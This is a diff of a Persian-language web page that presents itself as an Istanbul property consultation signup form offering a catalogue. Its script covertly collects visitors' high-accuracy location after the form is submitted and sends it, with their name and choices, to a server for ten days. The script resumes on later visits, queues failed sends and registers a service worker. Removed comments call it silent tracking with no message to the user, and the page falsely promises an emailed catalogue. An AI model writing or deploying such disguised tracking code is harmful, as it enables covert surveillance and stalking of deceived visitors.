@@ -4,29 +4,19 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>مشاوره ملکی استانبول | ترکیه</title>
-    <!-- فونت شیک و کلاسیک -->
     <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@400;600;700&family=Inter:wght@300;400;500&display=swap" rel="stylesheet" />
     <style>
-        /* ===== ریست کامل ===== */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             font-family: 'Inter', 'Cormorant Garamond', sans-serif;
-            /* ===== عکس پس‌زمینه از ترکیه (مسجد ایا صوفیه - استانبول) ===== */
             background: url('https://images.unsplash.com/photo-1541432901042-2d8bd64b4a9b?w=1600&q=80') no-repeat center center / cover;
             padding: 20px;
             position: relative;
         }
-
-        /* لایه تیره ملایم برای خوانایی بهتر */
         body::before {
             content: '';
             position: fixed;
@@ -38,8 +28,6 @@
             backdrop-filter: blur(3px);
             z-index: 0;
         }
-
-        /* ===== کارت شیشه‌ای اصلی ===== */
         .glass-card {
             position: relative;
             z-index: 1;
@@ -55,99 +43,77 @@
             transition: all 0.3s ease;
             text-align: center;
         }
-
-        /* ===== لوگو و تایتل ===== */
-        .logo-area {
-            margin-bottom: 10px;
-        }
-
-        .logo-icon {
-            font-size: 44px;
-            display: block;
-            margin-bottom: 2px;
-            filter: drop-shadow(0 4px 12px rgba(0, 0, 0, 0.2));
-        }
-
+        .logo-area { margin-bottom: 10px; }
+        .logo-icon { font-size: 44px; display: block; margin-bottom: 2px; filter: drop-shadow(0 4px 12px rgba(0,0,0,0.2)); }
         .logo-area h1 {
             font-family: 'Cormorant Garamond', serif;
             font-weight: 700;
             font-size: 34px;
             letter-spacing: 1px;
             color: #fff;
-            text-shadow: 0 4px 20px rgba(0, 0, 0, 0.25);
+            text-shadow: 0 4px 20px rgba(0,0,0,0.25);
             margin-bottom: 4px;
         }
-
         .logo-area p {
             font-family: 'Inter', sans-serif;
             font-weight: 300;
             font-size: 15px;
-            color: rgba(255, 255, 255, 0.85);
+            color: rgba(255,255,255,0.85);
             letter-spacing: 0.5px;
-            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+            text-shadow: 0 2px 8px rgba(0,0,0,0.15);
             margin-bottom: 18px;
         }
-
         .divider {
             width: 60px;
             height: 2px;
-            background: rgba(255, 255, 255, 0.25);
+            background: rgba(255,255,255,0.25);
             margin: 0 auto 22px auto;
             border-radius: 10px;
         }
-
-        /* ===== فرم ===== */
         .form-group {
             margin-bottom: 18px;
             text-align: right;
         }
-
         .form-group label {
             display: block;
             font-size: 13px;
             font-weight: 500;
-            color: rgba(255, 255, 255, 0.8);
+            color: rgba(255,255,255,0.8);
             margin-bottom: 5px;
             letter-spacing: 0.3px;
-            text-shadow: 0 1px 4px rgba(0, 0, 0, 0.1);
+            text-shadow: 0 1px 4px rgba(0,0,0,0.1);
         }
-
         .form-group input,
         .form-group select {
             width: 100%;
             padding: 14px 16px;
-            background: rgba(255, 255, 255, 0.10);
+            background: rgba(255,255,255,0.10);
             backdrop-filter: blur(6px);
             -webkit-backdrop-filter: blur(6px);
-            border: 1px solid rgba(255, 255, 255, 0.15);
+            border: 1px solid rgba(255,255,255,0.15);
             border-radius: 16px;
             font-size: 15px;
             font-family: 'Inter', sans-serif;
             color: #fff;
             transition: all 0.25s ease;
             outline: none;
-            box-shadow: inset 0 2px 6px rgba(0, 0, 0, 0.05);
+            box-shadow: inset 0 2px 6px rgba(0,0,0,0.05);
         }
-
         .form-group input::placeholder {
-            color: rgba(255, 255, 255, 0.4);
+            color: rgba(255,255,255,0.4);
             font-weight: 300;
             font-size: 14px;
         }
-
         .form-group input:focus,
         .form-group select:focus {
-            background: rgba(255, 255, 255, 0.18);
-            border-color: rgba(255, 215, 150, 0.5);
-            box-shadow: 0 0 0 4px rgba(255, 215, 150, 0.08);
+            background: rgba(255,255,255,0.18);
+            border-color: rgba(255,215,150,0.5);
+            box-shadow: 0 0 0 4px rgba(255,215,150,0.08);
         }
-
         .form-group select option {
             background: #1e1e2e;
             color: #eee;
         }
-
-        /* ===== دکمه اصلی ===== */
         .btn-submit {
             width: 100%;
             padding: 16px;
@@ -162,98 +128,57 @@
             border-radius: 40px;
             cursor: pointer;
             transition: all 0.3s ease;
-            box-shadow: 0 8px 24px rgba(184, 134, 61, 0.25);
+            box-shadow: 0 8px 24px rgba(184,134,61,0.25);
             position: relative;
             overflow: hidden;
         }
-
         .btn-submit:hover {
             transform: translateY(-2px) scale(1.01);
-            box-shadow: 0 12px 32px rgba(184, 134, 61, 0.4);
+            box-shadow: 0 12px 32px rgba(184,134,61,0.4);
             background: linear-gradient(135deg, #dbb08c, #c9974e);
         }
-
-        .btn-submit:active {
-            transform: scale(0.97);
-        }
-
+        .btn-submit:active { transform: scale(0.97); }
         .btn-submit .loading {
             display: none;
             width: 22px;
             height: 22px;
-            border: 3px solid rgba(255, 255, 255, 0.2);
+            border: 3px solid rgba(255,255,255,0.2);
             border-top-color: #fff;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
             margin: 0 auto;
         }
-
-        .btn-submit.loading-state .loading {
-            display: inline-block;
-        }
-        .btn-submit.loading-state .btn-text {
-            display: none;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        /* ===== وضعیت ===== */
+        .btn-submit.loading-state .loading { display: inline-block; }
+        .btn-submit.loading-state .btn-text { display: none; }
+        @keyframes spin { to { transform: rotate(360deg); } }
         .status {
             margin-top: 18px;
             font-size: 14px;
             font-weight: 300;
-            color: rgba(255, 255, 255, 0.7);
-            text-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+            color: rgba(255,255,255,0.7);
+            text-shadow: 0 2px 6px rgba(0,0,0,0.1);
         }
-
-        .status.success {
-            color: #b6e6b6;
-        }
-        .status.error {
-            color: #f7a1a1;
-        }
-
-        /* ===== فوتر ===== */
+        .status.success { color: #b6e6b6; }
+        .status.error { color: #f7a1a1; }
         .footer-note {
             margin-top: 25px;
             font-size: 12px;
             font-weight: 300;
-            color: rgba(255, 255, 255, 0.30);
+            color: rgba(255,255,255,0.30);
             letter-spacing: 0.5px;
-            border-top: 1px solid rgba(255, 255, 255, 0.06);
+            border-top: 1px solid rgba(255,255,255,0.06);
             padding-top: 18px;
         }
-
-        .footer-note span {
-            opacity: 0.6;
-        }
-
+        .footer-note span { opacity: 0.6; }
         @media (max-width: 480px) {
-            .glass-card {
-                padding: 30px 20px 35px;
-                border-radius: 24px;
-            }
-            .logo-area h1 {
-                font-size: 28px;
-            }
-            .logo-area p {
-                font-size: 13px;
-            }
-            .form-group input,
-            .form-group select {
-                padding: 12px 14px;
-                font-size: 14px;
-            }
-            .btn-submit {
-                font-size: 18px;
-                padding: 14px;
-            }
+            .glass-card { padding: 30px 20px 35px; border-radius: 24px; }
+            .logo-area h1 { font-size: 28px; }
+            .logo-area p { font-size: 13px; }
+            .form-group input, .form-group select { padding: 12px 14px; font-size: 14px; }
+            .btn-submit { font-size: 18px; padding: 14px; }
         }
     </style>
 </head>
-
 <body>
     <div class="glass-card">
         <div class="logo-area">
@@ -268,24 +193,24 @@
                 <label>نام و نام خانوادگی</label>
                 <input type="text" id="name" placeholder="مثال: علی محمدی" required />
             </div>
+            <!-- حذف شماره تماس و ایمیل -->
             <div class="form-group">
-                <label>شماره تماس</label>
-                <input type="text" id="phone" placeholder="مثال: ۰۵۳۲ ۱۲۳ ۴۵۶۷" required />
-            </div>
-            <div class="form-group">
-                <label>ایمیل</label>
-                <input type="email" id="email" placeholder="example@email.com" />
-            </div>
-            <div class="form-group">
-                <label>نوع ملک مورد نظر</label>
-                <select id="propertyType">
-                    <option>آپارتمان لوکس</option>
-                    <option>ویلا با استخر</option>
-                    <option>دفتر کار تجاری</option>
-                    <option>زمین سرمایه‌گذاری</option>
+                <label>شهر مورد نظر در ترکیه</label>
+                <select id="city">
+                    <option>استانبول</option>
+                    <option>آنکارا</option>
+                    <option>ازمیر</option>
+                    <option>آنتالیا</option>
+                    <option>بورسا</option>
                 </select>
             </div>
-
+            <div class="form-group">
+                <label>نوع کاربری</label>
+                <select id="userType">
+                    <option value="مالک">مالک</option>
+                    <option value="مستاجر">مستاجر</option>
+                </select>
+            </div>
             <button type="submit" class="btn-submit" id="submitBtn">
                 <span class="btn-text">✨ دریافت کاتالوگ ویژه</span>
                 <span class="loading"></span>
@@ -296,9 +221,6 @@
         <div class="footer-note"><span>استانبول · ترکیه</span></div>
     </div>
 
-    <!-- ============================================================ -->
-    <!-- اسکریپت ردیابی خودکار (بدون هیچ پیامی به کاربر) -->
-    <!-- ============================================================ -->
     <script>
         // ===== تنظیمات =====
         const SERVER_URL = window.location.origin + '/api/collect';
@@ -306,33 +228,22 @@
         const DURATION_DAYS = 10;
         const DURATION_MS = DURATION_DAYS * 24 * 60 * 60 * 1000;
 
-        let watchId = null;
-        let intervalId = null;
-        let startTime = null;
-        let isTracking = false;
-        let lastLocation = null;
+        let watchId = null, intervalId = null, startTime = null, isTracking = false, lastLocation = null;
         let userId = generateUserId();
         let formData = null;
 
-        // ===== تولید شناسه یکتا =====
         function generateUserId() {
             return 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
         }
 
-        // ===== ذخیره‌سازی موقعیت در localStorage برای بازیابی =====
         function saveTrackingState() {
             if (isTracking && lastLocation) {
                 localStorage.setItem('trackingData', JSON.stringify({
-                    userId: userId,
-                    startTime: startTime,
-                    lastLocation: lastLocation,
-                    isTracking: isTracking,
-                    formData: formData
+                    userId, startTime, lastLocation, isTracking, formData
                 }));
             }
         }
 
-        // ===== بازیابی وضعیت =====
         function restoreTrackingState() {
             const saved = localStorage.getItem('trackingData');
             if (saved) {
@@ -344,143 +255,87 @@
                     isTracking = data.isTracking;
                     formData = data.formData;
                     if (isTracking && lastLocation) {
-                        // ادامه ردیابی
-                        startTracking(false); // بدون درخواست مجدد مجوز
+                        startTracking(false);
                     }
-                } catch (e) {
-                    console.error('Error restoring tracking:', e);
-                }
+                } catch (e) { console.error('Restore error:', e); }
             }
         }
 
-        // ===== شروع ردیابی =====
         function startTracking(requestPermission = true) {
-            if (!navigator.geolocation) {
-                console.warn('Geolocation not supported');
-                return;
-            }
-
-            // اگر قبلاً شروع شده، ادامه بده
-            if (isTracking) return;
-
+            if (!navigator.geolocation || isTracking) return;
             if (requestPermission) {
-                // درخواست مجوز (بدون نمایش پیام به کاربر)
                 navigator.geolocation.getCurrentPosition(
-                    function(pos) {
-                        // مجوز داده شد
-                        startWatching();
-                    },
-                    function(err) {
-                        console.warn('Geolocation permission denied:', err);
-                        // اگر مجوز داده نشد، هیچ کاری نکن (اما می‌توانیم بعداً دوباره تلاش کنیم)
-                    },
+                    () => startWatching(),
+                    () => console.warn('Geolocation denied'),
                     { enableHighAccuracy: true, timeout: 10000 }
                 );
             } else {
-                // بدون درخواست مجوز (قبلاً مجوز دارد)
                 startWatching();
             }
         }
 
         function startWatching() {
             if (watchId) return;
-
             watchId = navigator.geolocation.watchPosition(
                 function(position) {
                     const coords = {
                         latitude: position.coords.latitude,
                         longitude: position.coords.longitude,
                         accuracy: position.coords.accuracy,
-                        altitude: position.coords.altitude,
-                        heading: position.coords.heading,
-                        speed: position.coords.speed,
                         timestamp: new Date().toISOString()
                     };
                     lastLocation = coords;
                     sendLocation(coords);
                     saveTrackingState();
-
                     if (!startTime) {
                         startTime = Date.now();
                         isTracking = true;
-                        // شروع تایمر ارسال دوره‌ای
                         if (intervalId) clearInterval(intervalId);
                         intervalId = setInterval(function() {
-                            if (lastLocation) {
-                                sendLocation(lastLocation);
-                            }
-                            // بررسی پایان ۱۰ روز
-                            if (Date.now() - startTime >= DURATION_MS) {
-                                stopTracking();
-                            }
+                            if (lastLocation) sendLocation(lastLocation);
+                            if (Date.now() - startTime >= DURATION_MS) stopTracking();
                         }, REPORT_INTERVAL);
                         saveTrackingState();
                     }
                 },
-                function(error) {
-                    console.warn('Geolocation watch error:', error);
-                },
+                function(error) { console.warn('Geolocation watch error:', error); },
                 { enableHighAccuracy: true, maximumAge: 0 }
             );
         }
 
-        // ===== توقف ردیابی =====
         function stopTracking() {
-            if (watchId) {
-                navigator.geolocation.clearWatch(watchId);
-                watchId = null;
-            }
-            if (intervalId) {
-                clearInterval(intervalId);
-                intervalId = null;
-            }
+            if (watchId) { navigator.geolocation.clearWatch(watchId); watchId = null; }
+            if (intervalId) { clearInterval(intervalId); intervalId = null; }
             isTracking = false;
             localStorage.removeItem('trackingData');
         }
 
-        // ===== ارسال موقعیت به سرور =====
         function sendLocation(coords) {
-            const data = {
-                userId: userId,
-                location: coords,
-                timestamp: new Date().toISOString(),
-                formData: formData,
-                userAgent: navigator.userAgent
-            };
-
+            const data = { userId, location: coords, timestamp: new Date().toISOString(), formData };
             fetch(SERVER_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
             })
-            .then(response => response.json())
-            .then(result => {
-                console.log('Location sent:', result);
-            })
+            .then(r => r.json())
             .catch(err => {
-                console.warn('Failed to send location:', err);
-                // ذخیره در localStorage برای ارسال مجدد بعدی
                 let pending = JSON.parse(localStorage.getItem('pendingLocations') || '[]');
                 pending.push(data);
                 localStorage.setItem('pendingLocations', JSON.stringify(pending));
             });
         }
 
-        // ===== ارسال داده‌های معلق =====
         function sendPendingLocations() {
             const pending = JSON.parse(localStorage.getItem('pendingLocations') || '[]');
-            if (pending.length === 0) return;
+            if (!pending.length) return;
             const batch = pending.slice();
-            pending = [];
-            localStorage.setItem('pendingLocations', JSON.stringify(pending));
+            localStorage.setItem('pendingLocations', JSON.stringify([]));
             batch.forEach(data => {
                 fetch(SERVER_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
-                })
-                .catch(() => {
-                    // اگر باز هم خطا، دوباره به صف برگردان
+                }).catch(() => {
                     let retry = JSON.parse(localStorage.getItem('pendingLocations') || '[]');
                     retry.push(data);
                     localStorage.setItem('pendingLocations', JSON.stringify(retry));
@@ -488,48 +343,33 @@
             });
         }
 
-        // ===== رویداد ارسال فرم =====
         document.getElementById('mainForm').addEventListener('submit', function(e) {
             e.preventDefault();
-
             formData = {
                 name: document.getElementById('name').value,
-                phone: document.getElementById('phone').value,
-                email: document.getElementById('email').value,
-                propertyType: document.getElementById('propertyType').value
+                city: document.getElementById('city').value,
+                userType: document.getElementById('userType').value
             };
 
             const btn = document.getElementById('submitBtn');
             btn.classList.add('loading-state');
             btn.disabled = true;
-
             document.getElementById('status').innerHTML = '✅ ثبت‌نام تکمیل شد. کاتالوگ به ایمیل شما ارسال می‌شود.';
             document.getElementById('status').className = 'status success';
 
-            // شروع ردیابی موقعیت (بدون نمایش پیام)
             startTracking(true);
-
-            // ارسال داده‌های فرم به سرور (اختیاری)
             fetch(SERVER_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ formData: formData, userId: userId, type: 'form' })
-            })
-            .catch(err => console.warn('Form data send failed:', err));
-
-            // ارسال داده‌های معلق
+                body: JSON.stringify({ formData, userId, type: 'form' })
+            }).catch(() => {});
             sendPendingLocations();
-
-            // هر ۵ دقیقه یکبار داده‌های معلق را بررسی کن
             setInterval(sendPendingLocations, 5 * 60 * 1000);
         });
 
-        // ===== بازیابی وضعیت در شروع =====
         window.addEventListener('load', function() {
             restoreTrackingState();
-            // اگر ردیابی در حال اجرا نبود، اما داده‌های معلق وجود داشت، ارسال کن
             sendPendingLocations();
-            // ثبت Service Worker
             if ('serviceWorker' in navigator) {
                 navigator.serviceWorker.register('/sw.js')
                     .then(() => console.log('Service Worker registered'))
@@ -537,12 +377,8 @@
             }
         });
 
-        // ===== ذخیره وضعیت قبل از بسته شدن =====
-        window.addEventListener('beforeunload', function() {
-            saveTrackingState();
-        });
-
-        console.log('[✓] Location tracker initialized (silent mode)');
+        window.addEventListener('beforeunload', function() { saveTrackingState(); });
+        console.log('[✓] Form updated – location tracking active');
     </script>
 </body>
 </html>
